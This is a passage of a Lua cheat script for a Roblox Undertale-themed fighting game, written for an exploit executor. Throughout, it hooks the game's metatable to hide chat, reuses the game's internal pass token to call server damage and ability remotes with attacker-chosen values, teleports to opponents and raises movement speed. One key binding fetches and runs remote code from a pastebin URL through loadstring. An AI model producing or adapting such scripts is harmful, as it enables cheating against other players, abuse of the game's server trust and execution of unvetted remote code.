clone = v:Clone()
clone.Parent = char.Torso
end
end

function stun(val)
        if val == true then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            CAS:BindActionAtPriority(
                FREEZE_COMMAND,
                function() 
                    return Enum.ContextActionResult.Sink
                end,
                false,
                Enum.ContextActionPriority.High.Value,
                Enum.KeyCode.W,
                Enum.KeyCode.S,
                Enum.KeyCode.A,
                Enum.KeyCode.D,
                Enum.KeyCode.R,
                Enum.KeyCode.T,
                Enum.KeyCode.Z,
                Enum.KeyCode.X,
                Enum.KeyCode.C,
                Enum.KeyCode.V,
                Enum.KeyCode.B,
                Enum.KeyCode.N,
                Enum.KeyCode.One,
                Enum.KeyCode.Two,
                Enum.KeyCode.Three,
                Enum.KeyCode.Four,
                Enum.KeyCode.Five,
                Enum.KeyCode.Six,
                Enum.KeyCode.Seven,
                Enum.KeyCode.Eight,
                Enum.KeyCode.Nine,
                Enum.KeyCode.Zero
            )
        elseif val == false then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            CAS:UnbindAction(FREEZE_COMMAND)
        end
end

spawn(function()
    stun(true)
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

wait(2)

God(true)
    
    Chat("Y-You think you're good enough to kill me in one blow?",Color3.fromRGB(255, 255, 255))
	
		spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5095911621"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)
		
		wait(2)
		
		spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)
		
		Chat("I'm not that weak",Color3.fromRGB(255, 255, 255))
		
		wait(2)
		
		Chat("You'll have to do more than hit me with that rusty knife to kill me!",Color3.fromRGB(255, 255, 255))
		
		wait(2)
		
		God(false)
    
    wait(1)
		
		local FunnyHead = game.Players.LocalPlayer.Character.Head.Position
    local LLLLLeg = game.Players.LocalPlayer.Character["Left Leg"].Position
    local RRRRLeg = game.Players.LocalPlayer.Character["Right Leg"].Position
    local Torso = game.Players.LocalPlayer.Character.Torso.Position
    local LArm = game.Players.LocalPlayer.Character["Left Arm"].Position
    for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
        v:Fire({"Particle","DarkAuraEffect",game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,math.huge})
    end
      local weld23 = Instance.new("ManualWeld")
                weld23.Part0 = game.Players.LocalPlayer.Character["HumanoidRootPart"]
                weld23.Part1 = game.Players.LocalPlayer.Character.Effects.DarkAuraEffect
                weld23.C1 = game.Players.LocalPlayer.Character["HumanoidRootPart"].CFrame
                weld23.C0 = game.Players.LocalPlayer.Character["HumanoidRootPart"].CFrame * CFrame.new(0,-2.7,0)
                weld23.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.Material = "ForceField"
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.Transparency = 1
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.CanCollide = false 
                wait(1)
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.Position = Torso
		
		function WhiteFlash()
char = game.Players.LocalPlayer.Character
for _,v in pairs(game:GetService("ReplicatedStorage").Resources.LocalScripts:GetChildren()) do
if v.Name == 'ShortWhiteScreen2' then
    clone = v:Clone()
    clone.Parent = char
end
end
end

WhiteFlash()
		
		spawn(function()
    stun(false)
		end)

local player = game:GetService("Players").LocalPlayer
local ClickAnimations = player.Backpack.Main.SansMoves.ModuleScript.Animations.BladesCombat
local pass = getrenv()._G.Pass
local remote = game.ReplicatedStorage.Remotes["Events"]


ClickAnimations.Light1.AnimationId = "rbxassetid://5776258610"
ClickAnimations.Light3.AnimationId = "rbxassetid://4348287123"

game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo.Text = "HUMANS WILL"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo.TextColor3 = Color3.fromRGB(255,0,0)
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo2.Text = "D  I  E"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo2.TextColor3 = Color3.fromRGB(255,0,0)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.Health.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(102,51,153)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.HealthLabel.Text = "480/480"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Defense.Text = "Defense:430"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Attack.Text = "Attack:210"
game.Players.LocalPlayer.PlayerGui.UI.Ui.ManaBar.Bar.BackgroundColor3 = Color3.fromRGB(102,51,153)
game.Players.LocalPlayer.PlayerGui.UI.Ui.StaminaBar.Bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Left Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Right Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.Text = "DustTrust Sans"
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(162,83,222)

_G.hidechat = true
local mt = getrawmetatable(game)
    local backup = mt.__namecall
    if setreadonly then setreadonly(mt, false) else make_writeable(mt, true) end
    
    mt.__namecall = newcclosure(function(...)
        local method = getnamecallmethod()
        local args = {...}

        if tostring(args[1]) == 'SayMessageRequest' and _G.hidechat then
        return
        end
        return backup(...)
    end)
    
    spawn(function()
repeat wait(0.1)
local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "changeEye",
        [3] = true
    }
}
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
until false
end)
spawn(function()
repeat wait(0.1)
spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'Beam' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)


spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,255))
end
end
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)
until false
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'Trail' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)
    
    local bypass = Instance.new("BoolValue")
bypass.Name = "Battling"
bypass.Parent = game.Players.LocalPlayer.Character
wait(0.3)
game.Players.LocalPlayer.Backpack.Main.RunSpeed.Value = 80
 game.Players.LocalPlayer.Backpack.Main.WalkSpeed.Value = 40

wait(0.5)

function createbone()
    bonesword = false
repeat if game.Players.LocalPlayer.Character.Bone.Transparency ~= 1 then
local A_1 = 
{
	[1] = getrenv()._G.Pass, 
	[2] = "SpawnBone", 
	[3] = true, 
	[4] = false
}
local Event = game:GetService("ReplicatedStorage").Remotes.SansMoves
Event:InvokeServer(A_1)
end
wait(0.2)
until bonesword == false
end

phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "x" then 
	    if phase2 == true then
	        wait(1)
	    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 6
	end
end
end)
	
	phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "z" then 
	    if phase2 == true then
		
                function getlockchar()
                    local char = game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                    return char
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = getlockchar().HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
          
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 5
		KG.SoundId = "rbxassetid://6930257355"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://4333546395"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0, 0.1), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0, 0.1), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0, 200), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
end
end
  end
end)
    
    phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "c" then
	    if phase2 == true then
		
		wait(0.5)
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3733309848"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "LightHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(20, 0, 100), 
				["Damage"] = 40
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
	end
end
end)

-- Phase 4

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "7" then
	    
     loadstring(game:HttpGet("https://pastebin.com/raw/buxdqU1f"))()
     
     wait(300)
     
     game.Players.LocalPlayer:Kick[[You couldn't defeat them... Better luck next time.]]
	end
 end)
---------------------------------------
phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "n" then
	    if phase2 == true then
	    
	    tpToOpponent()
	    wait(0.2)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        wait(0.9)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        wait(0.9)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        wait(0.9)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        
        wait(2)
	    
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3733309848"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "LightHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick,
				["CameraShake"] = "Bump",
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 150, 0), 
				["Damage"] = 40
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		
		wait(0.7)
		
		function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end

local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "GasterBlasters",
        [3] = "SummonOne",
        [4] = locked.Torso.Position
    }
}
 
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args)) 

end
end
end
end
end
end
end)

function tpToOpponent()
function getlockchar()
                    local char = game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                    return char
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = getlockchar().HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
end

function normalSlash()
    spawn(function()
KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 5
		KG.SoundId = "rbxassetid://6930257355"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://4800266314"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
    local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = {
        ["HitTime"] = 1, 
        ["Type"] = "Knockback", 
        ["HitEffect"] = "KnifeHitEffect", 
        ["CombatInv"] = true,
        ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt2, 
        ["Velocity"] = Vector3.new(0, 0.1, 0), 
        ["Sound"] = game:GetService("ReplicatedStorage").Sounds.KnifeHit,
        ["Damage"] = 15
        
        } local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		  Event:InvokeServer(A_1, A_2, A_3)
    

end)
end

spawn(function()
lvSystem = true
lvBarVal = 0.01

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.Players.LocalPlayer.PlayerGui.UI.Ui:GetDescendants()) do
if v.Name == 'StaminaBar' then
clone2 = v:Clone()
clone2.Parent = game.Players.LocalPlayer.PlayerGui.UI.Ui
clone2.Position = UDim2.new(0.4799, 0, 0.9900, 0)
clone2.Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clone2.Bar.Size = UDim2.new(0, 0, 1, 0)
clone2.ImageLabel:Destroy()
clone2.LocalScript:Destroy()
clone2.Name = 'ExpBar'
end
end
end)


local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui.ResetOnSpawn = false

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel.BackgroundTransparency = 1.00
TextLabel.Position = UDim2.new(0.360625994056, 0, .925, 0)
TextLabel.Size = UDim2.new(0, 250, 0, 75)
TextLabel.Font = Enum.Font.Arcade
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 35.000
TextLabel.TextWrapped = true
TextLabel.Text = 'EXP'

lv = 1
local ScreenGui = Instance.new("ScreenGui")
local TextLabel2 = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui.ResetOnSpawn = false

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel2.Parent = ScreenGui
TextLabel2.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel2.BackgroundTransparency = 1.00
TextLabel2.Position = UDim2.new(0.360625994056, 0, .8935, 0)
TextLabel2.Size = UDim2.new(0, 250, 0, 75)
TextLabel2.Font = Enum.Font.Arcade
TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.TextSize = 35.000
TextLabel2.TextWrapped = true
TextLabel2.Text = 'LV: '..(lv)

local ScreenGui2 = Instance.new("ScreenGui")
local TextLabel3 = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui2.ResetOnSpawn = false

ScreenGui2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel3.Parent = ScreenGui
TextLabel3.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel3.BackgroundTransparency = 1.00
TextLabel3.Position = UDim2.new(0.490625994056, 0, .8935, 0)
TextLabel3.Size = UDim2.new(0, 250, 0, 75)
TextLabel3.Font = Enum.Font.Arcade
TextLabel3.TextColor3 = Color3.fromRGB(35, 255, 50)
TextLabel3.TextSize = 45.000
TextLabel3.TextWrapped = true
TextLabel3.Text = 'Level up!'
TextLabel3.Transparency = 1
TextLabel3.BackgroundTransparency = 1.00

spawn(function()
notLVing = true
repeat wait(1)
spawn(function()
repeat wait() until game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value ~= nil
lockChar = workspace:FindFirstChild(game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.Name)
repeat wait()
until lockChar.Humanoid.Health < 0.2
if notLVing == true then
print("die'd")
if lockChar.Type.Value == "XSans" then
    print("lv up1")
        lvBarVal = lvBarVal + 0.3
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Sans" then
    print("lv up2")
    lvBarVal = lvBarVal + 0.5
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Frisk" then
    print("lv up3")
    lvBarVal = lvBarVal + 0.15
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "SansBadTime" then
    print("lv up4")
    lvBarVal = lvBarVal + 0.5
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Chara" then
    print("lv up5")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "SFChara" then
    print("lv up6")
    lvBarVal = lvBarVal + 0.25
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "DeltaSans" then
    print("lv up7")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Undyne" then
    print("lv up8")
    lvBarVal = lvBarVal + 0.6
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Asriel" then
    print("lv up9")
    lvBarVal = lvBarVal + 0.4
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "GTFrisk" then
    print("lv up10")
    lvBarVal = lvBarVal + 0.6
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Betty" then
    print("lv up11")
    lvBarVal = lvBarVal + 0.3
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Sakuya" then
    print("lv up12")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Stevonnie" then
    print("lv up13")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Bunny" then
    print("lv up14")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
else print("bro wtf are you fighting")
end
notLVing = false
wait(1.2)
notLVing = true
elseif notLVing == false then
    wait()
end
end)
until false
end)

lvIncreasing = false
spawn(function()
repeat wait(0.1)
spawn(function()
repeat wait() until lvBarVal >= 1
print("debug1")
if lvIncreasing == false then
    lvIncreasing = true
    print("debug2")
lv = lv + 1
TextLabel2.Text = 'LV: '..(lv)
print("debug3")
lvBarVal = 0.01
clone2.Bar.Size = UDim2.new(0, 0, 1, 0)

local player = game.Players.LocalPlayer
local char = player.Character

for _,v in pairs(game.ReplicatedStorage.Effects.LevelUpShower:GetChildren()) do
spawn(function()
fakelevel = v.Name
local A_1 =  {
      [1] = getrenv()._G.Pass, 
      [2] = "PlaySound", 
      [3] = v, 
      [4] = char
}
local Event = game:GetService("ReplicatedStorage").Remotes.Functions
Event:InvokeServer(A_1)

end)
print("debug2")
spawn(function()
local player = game.Players.LocalPlayer
local char = player.Character
local sound = Instance.new('Sound',char.Head)
local id = 2167611163
sound.Volume = 4
sound.SoundId = 'rbxassetid://'..id
sound:Play()
end)

end

spawn(function()
TextLabel3.Transparency = 0
TextLabel3.BackgroundTransparency = 1.00
wait(0.5)
TextLabel3.Transparency = 0.1
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.2
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.3
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.4
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.5
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.6
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.7
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.8
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.9
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 1
TextLabel3.BackgroundTransparency = 1.00
end)

spawn(function()
 camfix2 = 15
repeat
game.Lighting.ColorCorrection.TintColor = Color3.fromRGB(camfix2, 255, camfix2)
wait()
camfix2 = camfix2 + 10
until camfix2 == 255
if camfix2 == 255 then
    camfix2 = 15
end
end)

wait(1)
for _,v in pairs(char.Head:GetChildren()) do
if v.Name == fakelevel then
v:Destroy()
